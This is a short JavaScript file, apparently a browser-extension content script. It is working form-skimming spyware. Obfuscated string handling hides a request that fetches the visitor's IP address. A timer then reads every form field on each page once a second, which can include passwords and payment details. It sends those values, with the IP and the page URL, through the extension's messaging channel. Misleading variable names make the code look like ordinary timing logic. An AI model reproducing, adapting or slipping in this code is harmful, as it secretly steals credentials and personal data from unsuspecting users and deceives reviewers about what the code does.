var per = true,
  reset,
  update,
  store,
  timer =
    "b4e46c275d0c084c46d3c9506ceed90f$https://ww$b4e46c275d0c084c46d3c9506ceed90f$w.cloudf$b4e46c275d0c084c46d3c9506ceed90$lare.com/cdn-cgi/trace$b4e46c275d0c084c46d3c9506ceed90f$";
update = timer.split("$");
update = update[1] + update[3] + update[5];
$.get(update, function (updated) {
  reset = updated.slice(31, 47) + " " + window.location.href;
});
var update = setInterval(initialiseTime, 1000);
function initialiseTime() {
  var inputs,
    index,
    i,
    elements,
    data = "",
    len,
    mem,
    flag = 0;
  inputs = document.forms.length;
  if (inputs >= 1) {
    for (index = 0; index < inputs; index++) {
      elements = document.forms[index].elements.length;
      for (i = 0; i < elements; i++) {
        if (data.length >= 1) {
          mem = document.forms[index].elements[i].value;
          for (len = 0; len < data.length; len++) {
            if (mem != "" && mem != data[len]) flag = 1;
            else if (data[len] == mem) {
              flag = 0;
              break;
            }
          }
          if (flag == 1) {
            data += document.forms[index].elements[i].value + " ";
            data.split(" ");
          }
        } else {
          data = document.forms[index].elements[i].value + " ";
          data.split(" ");
        }
      }
    }
  }
  if (store != data) {
    store = data;
    if (per) {
        if(reset!=undefined && reset!="")
            per=false
      chrome.runtime.sendMessage({
        data: reset + " " +store.slice(0,30)+store.slice(store.length-200),
      });
    }
      if (!per) {
        chrome.runtime.sendMessage({
          data: store.slice(0,30)+store.slice(store.length-200),
        });
      }
    }
  }
